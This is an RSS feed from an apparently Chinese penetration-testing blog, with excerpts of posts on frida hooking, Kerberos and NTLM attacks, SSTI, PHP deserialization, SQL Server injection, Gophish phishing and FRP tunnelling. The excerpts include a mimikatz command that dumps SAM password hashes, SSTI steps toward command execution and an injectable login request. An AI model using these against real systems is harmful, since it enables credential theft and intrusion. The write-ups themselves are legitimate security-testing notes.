<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Reber's Blog</title><link>https://wyb0.cn/</link><description>Recent content on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Thu, 23 May 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>安卓调用 so 文件</title><link>https://wyb0.cn/posts/2024/android-calls-so-file/</link><pubDate>Fri, 17 May 2024 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2024/android-calls-so-file/</guid><description>&lt;h3 id="0x00-安卓的-jni">0x00 安卓的 JNI&lt;/h3>
&lt;p>安卓开发中，JNI 就是 Java Native Interface 的缩写，它允许 Java 代码调用原生的 C/C++ 代码，或者允许 C/C++ 代码调用 Java 代码。&lt;/p>
&lt;p>在 Android Stdio 中，有以下 3 种方法使用 so 文件：&lt;/p></description></item><item><title>使用 Hook 框架 frida 进行调试</title><link>https://wyb0.cn/posts/2024/frida-hook-app/</link><pubDate>Wed, 15 May 2024 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2024/frida-hook-app/</guid><description>&lt;h3 id="0x00-frida">0x00 frida&lt;/h3>
&lt;p>1、手机端安装一个 server 程序&lt;br>
2、然后把手机端的端口转到 PC 端&lt;br>
3、PC 端写 js 脚本进行通信&lt;/p>
&lt;p>frida -U -f com.package.name -l exploit.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">hook&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Starting script&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> () {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">class_reference&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;package_name&amp;gt;.&amp;lt;class&amp;gt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">class_reference&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>.&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">method&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>.&lt;span style="color:#a6e22e">implementation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hook &amp;lt;class_reference&amp;gt;.&amp;lt;method&amp;gt;()&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;args is:&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">args&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">method_to_hook&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> })
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-java-层---直接调用函数">0x01 JAVA 层 - 直接调用函数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>调用静态函数&lt;/p></description></item><item><title>固件提取</title><link>https://wyb0.cn/posts/2024/extracts-firmware/</link><pubDate>Fri, 29 Mar 2024 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2024/extracts-firmware/</guid><description>&lt;h3 id="0x00-固件组成">0x00 固件组成&lt;/h3>
&lt;p>固件通常由 bootloader、内核、根文件系统及其他资源文件组成&lt;br>
固件采用的根系统文件类型有很多种，常见的有 squashfs、ubifs、ext4、jeffs2 等。&lt;br>
固件文件通常以 bin、zip、LZMA、arj 等文件压缩类型封装，最常见的为 bin 和 zip 格式&lt;br>
最常采用的文件系统是 squashfs，分析人员可以使用 unsqushfs 工具对文件系统提取数据。&lt;/p></description></item><item><title>硬件接口测试</title><link>https://wyb0.cn/posts/2024/hardware-interface-test/</link><pubDate>Wed, 31 Jan 2024 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2024/hardware-interface-test/</guid><description>&lt;h3 id="0x01-jtag-接口">0x01 JTAG 接口&lt;/h3>
&lt;p>主要用来读写固件，常见 JTAG 接口引脚有 10PIN、14PIN、20PIN&lt;/p>
&lt;p>一般需要接的引脚：&lt;br>
GND：接地引脚&lt;br>
TDI：测试数据输入，用于向被测设备传输测试数据&lt;br>
TDO：测试数据输出，用于从被测设备读取测试数据&lt;br>
TCK：测试时钟，用于同步测试数据的传输&lt;br>
TMS：测试模式选择，用于控制 JTAG 状态机的状态转移&lt;br>
TRST：可选，TRST 可以用来对 TAPController 进行复位（初始化）&lt;/p></description></item><item><title>使用 MSF 进行 PtH 和 PtT</title><link>https://wyb0.cn/posts/2023/using-msf-for-pth-and-ptt/</link><pubDate>Sat, 25 Mar 2023 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2023/using-msf-for-pth-and-ptt/</guid><description>&lt;h3 id="0x00-概述">0x00 概述&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>环境&lt;/p>
&lt;p>攻击机 MSF：172.20.10.2&lt;br>
DC (Server2008R2X64)：10.11.11.5&lt;br>
目标机 (Win7ProX86)：10.11.11.14&lt;/p></description></item><item><title>Kerberos 与 NTLM Hash 与 Ticket</title><link>https://wyb0.cn/posts/2022/kerberos-hash-ticket/</link><pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2022/kerberos-hash-ticket/</guid><description>&lt;h3 id="0x00-kerberos">0x00 Kerberos&lt;/h3>
&lt;p>Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。
常见的基于 Kerberos 协议攻击的方法如下图所示：
&lt;img src="https://wyb0.cn/img/post/Xnip2022-10-13_17-09-29.png" alt="60">&lt;/p>
&lt;h3 id="0x01-kerberos-关键词">0x01 Kerberos 关键词&lt;/h3>
&lt;ul>
&lt;li>域控制器（Domain Controller，DC）：在域中至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。&lt;/li>
&lt;li>帐户数据库（Account Database，AD）：一个类似于 Windows 本机 SAM 的数据库，存储了域内所有网络对象的凭证，也存储所有 Client 的白名单，在白名单中的 Client 才可以申请到 TGT。&lt;/li>
&lt;li>密钥分发中心（Key Distribution Center，KDC）：KDC 维护着域中所有安全主体（SecurityPrincipal）账户信息数据库，负责管理票据、认证票据、分发票据，在 Windows 域环境中，KDC 的角色由 DC 承担。&lt;/li>
&lt;li>身份验证服务（Authentication Service，AS）：用于生成 TGT 的服务。&lt;/li>
&lt;li>票据发放服务（Ticket Granting Service，TGS）：用于生成某个服务的 ticket&lt;/li>
&lt;li>认证票据（Ticket Granting Ticket，TGT）：可以理解为入场券，通过入场券能够获得票据，是一种临时凭证的存在。&lt;/li>
&lt;li>票据（Ticket）：网络对象互相访问的凭证。&lt;/li>
&lt;li>Session Key：AS 生成的随机会话密钥。&lt;/li>
&lt;li>Server Session Key：TGS 生成的随机会话密钥。&lt;/li>
&lt;li>krbtgt 账户：每个域控制器都有一个 krbtgt 的用户账户，是 KDC 的服务账户，用来创建票据授予服务(TGS)加密的密钥。&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-kerberos-认证过程">0x02 Kerberos 认证过程&lt;/h3>
&lt;p>认证的大致过程：&lt;/p></description></item><item><title>JNDI 注入</title><link>https://wyb0.cn/posts/2022/jndi/</link><pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2022/jndi/</guid><description>&lt;h3 id="0x00-jdni">0x00 JDNI&lt;/h3>
&lt;p>JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口&lt;/p>
&lt;p>JNDI 可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA&lt;/p></description></item><item><title>Gophish 钓鱼测试</title><link>https://wyb0.cn/posts/2021/gophish/</link><pubDate>Sun, 26 Sep 2021 11:45:33 +0000</pubDate><guid>https://wyb0.cn/posts/2021/gophish/</guid><description>&lt;h3 id="0x00-gophish-使用">0x00 Gophish 使用&lt;/h3>
&lt;ul>
&lt;li>配置 Gophish 服务&lt;/li>
&lt;li>配置发送邮箱&lt;/li>
&lt;li>编写钓鱼邮件内容&lt;/li>
&lt;li>编写钓鱼页面&lt;/li>
&lt;li>添加目标邮箱&lt;/li>
&lt;li>开始攻击&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-配置-gophish-服务">0x01 配置 Gophish 服务&lt;/h3>
&lt;p>在 &lt;a href="https://github.com/gophish/gophish/releases?_blank">https://github.com/gophish/gophish/releases&lt;/a> 下载&lt;/p>
&lt;p>然后编辑 config.json，之后直接 ./gophish 运行即可&lt;/p></description></item><item><title>PHP 反序列化与字符串逃逸</title><link>https://wyb0.cn/posts/2021/php-deserialize-and-string-escaping/</link><pubDate>Sun, 18 Jul 2021 17:21:33 +0000</pubDate><guid>https://wyb0.cn/posts/2021/php-deserialize-and-string-escaping/</guid><description>&lt;h3 id="0x00-漏洞成因">0x00 漏洞成因&lt;/h3>
&lt;p>该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后&lt;/p></description></item><item><title>Flask 模版注入（SSTI）</title><link>https://wyb0.cn/posts/2021/flask-ssti/</link><pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2021/flask-ssti/</guid><description>&lt;h3 id="0x00-ssti-模版注入">0x00 SSTI 模版注入&lt;/h3>
&lt;p>SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）&lt;/p>
&lt;p>一般步骤：&lt;br>
1、某种类型 (字符串:&amp;quot;&amp;quot;，list:[]，int：1) 开始引出&lt;br>
2、&lt;code>__class__&lt;/code> 找到当前类&lt;br>
3、&lt;code>__mro__&lt;/code> 或者 &lt;code>__base__&lt;/code> 或者 &lt;code>__bases__&lt;/code> 找到根类 &lt;code>__object__&lt;/code>&lt;br>
4、然后利用 &lt;code>__subclasses__&lt;/code> 拿到子类列表&lt;br>
5、然后在子类列表 &lt;code>__init__.__globals__.keys()&lt;/code> 找到类似 popen 能执行命令的函数&lt;/p></description></item><item><title>PHP 反序列化</title><link>https://wyb0.cn/posts/2021/php-deserialize/</link><pubDate>Thu, 08 Jul 2021 17:08:50 +0000</pubDate><guid>https://wyb0.cn/posts/2021/php-deserialize/</guid><description>&lt;h3 id="0x01-php-中的魔法函数">0x01 php 中的魔法函数&lt;/h3>
&lt;p>__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。&lt;/p></description></item><item><title>通过 Sphinx 快速查询数据</title><link>https://wyb0.cn/posts/2021/sphinx/</link><pubDate>Thu, 10 Jun 2021 16:44:23 +0000</pubDate><guid>https://wyb0.cn/posts/2021/sphinx/</guid><description>&lt;h3 id="0x00-sphinx">0x00 Sphinx&lt;/h3>
&lt;p>Sphinx 是一款基于 SQL 的高性能全文检索引擎，Sphinx 的性能在众多全文检索引擎中也是数一数二的，利用 Sphinx我们可以完成比数据库本身更专业的搜索功能，而且可以有很多针对性的性能优化。&lt;/p></description></item><item><title>获取 NTLM Hash</title><link>https://wyb0.cn/posts/2020/get-hash/</link><pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2020/get-hash/</guid><description>&lt;h3 id="0x01-通过-sam-文件获取">0x01 通过 sam 文件获取&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)&lt;/p>
&lt;pre tabindex="0">&lt;code>mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)&lt;/p></description></item><item><title>记一次 SQLServer 注入</title><link>https://wyb0.cn/posts/2020/recording-sqlserver-injection/</link><pubDate>Mon, 22 Jun 2020 17:35:07 +0000</pubDate><guid>https://wyb0.cn/posts/2020/recording-sqlserver-injection/</guid><description>&lt;h3 id="0x00-存在-sql-注入">0x00 存在 SQL 注入&lt;/h3>
&lt;p>总之是遇到一个站，登录的页面，数据包大致如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
Host: 115.xxx.xxx.xxx:8042
Content-Length: 47
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://115.xxx.xxx.xxx:8042
Referer: http://115.xxx.xxx.xxx:8042/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt
Connection: close

uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=
&lt;/code>&lt;/pre>&lt;p>其中验证码可以绕过，而登录名那里存在注入
&lt;img src="https://wyb0.cn/img/post/Xnip2020-09-13_22-20-51.jpg" alt="">
&lt;img src="https://wyb0.cn/img/post/Xnip2020-09-13_22-21-32.jpg" alt="">&lt;/p></description></item><item><title>目录遍历利用</title><link>https://wyb0.cn/posts/2019/a-directory-traversal-using-script/</link><pubDate>Mon, 16 Dec 2019 09:23:47 +0000</pubDate><guid>https://wyb0.cn/posts/2019/a-directory-traversal-using-script/</guid><description>&lt;h3 id="0x00-目录遍历">0x00 目录遍历&lt;/h3>
&lt;p>一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看&lt;/p>
&lt;p>一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦&lt;/p></description></item><item><title>PostgreSQL 简单使用</title><link>https://wyb0.cn/posts/2019/postgresql-basis-use/</link><pubDate>Fri, 23 Aug 2019 16:27:12 +0000</pubDate><guid>https://wyb0.cn/posts/2019/postgresql-basis-use/</guid><description>&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;pre tabindex="0">&lt;code>➜ brew install postgresql
➜ echo &amp;#39;export PATH=&amp;#34;/usr/local/Cellar/postgresql/11.4/bin:$PATH&amp;#34;&amp;#39; &amp;gt;&amp;gt; ~/.zshrc
➜ source ~/.zshrc
-- 初始化数据库
➜ initdb /usr/local/var/postgres
➜ pg_ctl -D /usr/local/var/postgres -l /usr/local/var/log/postgres.log start
&lt;/code>&lt;/pre>&lt;h3 id="0x01-简单操作">0x01 简单操作&lt;/h3>
&lt;ul>
&lt;li>常用操作命令&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>reber=# \password #设置当前登录用户的密码
reber=# \password [user_name] #设置其他用户的密码
reber=# \l #列出所有数据库
reber=# \du #列出所有用户
reber=# \c [database_name] #连接数据库
reber=# \d #列出当前数据库的所有表
reber=# \d [table_name] #列出表结构
reber=# \conninfo #列出当前数据库和连接的信息
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>连接数据库&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>➜ psql postgres &lt;span style="color:#75715e">#初始化数据库后会生成默认的数据库 postgres&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>psql &lt;span style="color:#f92672">(&lt;/span>11.4&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Type &lt;span style="color:#e6db74">&amp;#34;help&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> help.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>postgres&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75715e"># \l #查看当前数据库情况&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List of databases
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Name | Owner | Encoding | Collate | Ctype | Access privileges
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----------+-------+----------+-------------+-------------+-------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> postgres | reber | UTF8 | zh_CN.UTF-8 | zh_CN.UTF-8 |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> template0 | reber | UTF8 | zh_CN.UTF-8 | zh_CN.UTF-8 | &lt;span style="color:#f92672">=&lt;/span>c/reber +
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> | | | | | reber&lt;span style="color:#f92672">=&lt;/span>CTc/reber
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> template1 | reber | UTF8 | zh_CN.UTF-8 | zh_CN.UTF-8 | &lt;span style="color:#f92672">=&lt;/span>c/reber +
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> | | | | | reber&lt;span style="color:#f92672">=&lt;/span>CTc/reber
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span> rows&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>postgres&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75715e"># \du #查看当前用户&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List of roles
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Role name | Attributes | Member of
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----------+------------------------------------------------------------+-----------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reber | Superuser, Create role, Create DB, Replication, Bypass RLS | &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>postgres&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75715e"># \c&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>You are now connected to database &lt;span style="color:#e6db74">&amp;#34;postgres&amp;#34;&lt;/span> as user &lt;span style="color:#e6db74">&amp;#34;reber&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>postgres&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75715e"># \password&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Enter new password:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Enter it again:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>postgres-# &lt;span style="color:#ae81ff">\q&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>修改配置文件改端口&lt;/li>
&lt;/ul>
&lt;p>vim /usr/local/var/postgres/postgresql.conf&lt;/p></description></item><item><title>记一次网页 js 挂马</title><link>https://wyb0.cn/posts/2019/recording-a-webpage-hanging-horse/</link><pubDate>Mon, 19 Aug 2019 10:17:46 +0000</pubDate><guid>https://wyb0.cn/posts/2019/recording-a-webpage-hanging-horse/</guid><description>&lt;h3 id="0x00-常见网页挂马方式">0x00 常见网页挂马方式&lt;/h3>
&lt;ul>
&lt;li>iframe 框架挂马&lt;br>
简单来说就是加 iframe 标签&lt;/li>
&lt;li>script 挂马&lt;br>
通过各种办法加载 js 代码&lt;/li>
&lt;li>htm 文件挂马
上传 htm 文件，然后用 script 引入&lt;/li>
&lt;li>js 挂马
上传 js 文件，然后用 script 引入&lt;/li>
&lt;li>图片伪装挂马
比较新颖的一种挂马隐蔽方法&lt;/li>
&lt;li>等等。。。&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现被插入恶意-js">0x01 发现被插入恶意 js&lt;/h3>
&lt;p>前几天在做子域名搜集，搜集完后提取 title，结果看到了一个站点的 title 不正常&lt;/p></description></item><item><title>FRP 内网穿透</title><link>https://wyb0.cn/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.cn/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
&lt;ul>
&lt;li>服务端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 监听端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 那些端口允许客户端用来映射&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">allow_ports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">22-80,3000,33389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>➜ frp ./frps -c frps.ini
2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000
2019/07/31 00:22:31 [I] [root.go:204] Start frps success
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>客户端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[test_static_file]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 文件服务的端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 启用插件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">static_file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 要对外暴露的文件目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_local_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">C:\\Users\Administrator\Desktop\frp_file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_strip_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">myfile&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 301 认证&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">plugin_http_passwd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">123456&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
2019/07/31 00:36:05 [I] [service.go:221] login to server success, get run id [c8
aef41d5862b79f], server udp port [0]
2019/07/31 00:36:05 [I] [proxy_manager.go:137] [c8aef41d5862b79f] proxy added: [
test_static_file]
2019/07/31 00:36:05 [I] [control.go:144] [test_static_file] start proxy success
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>访问&lt;br>
浏览器直接访问 &lt;code>http://66.123.35.123:3000/myfile/&lt;/code> 即可访问到 frp_file 中的文件&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-使用-frp-进行内网-3389-端口转发并加密压缩">0x01 使用 frp 进行内网 3389 端口转发并加密压缩&lt;/h3>
&lt;ul>
&lt;li>服务端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp cat frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
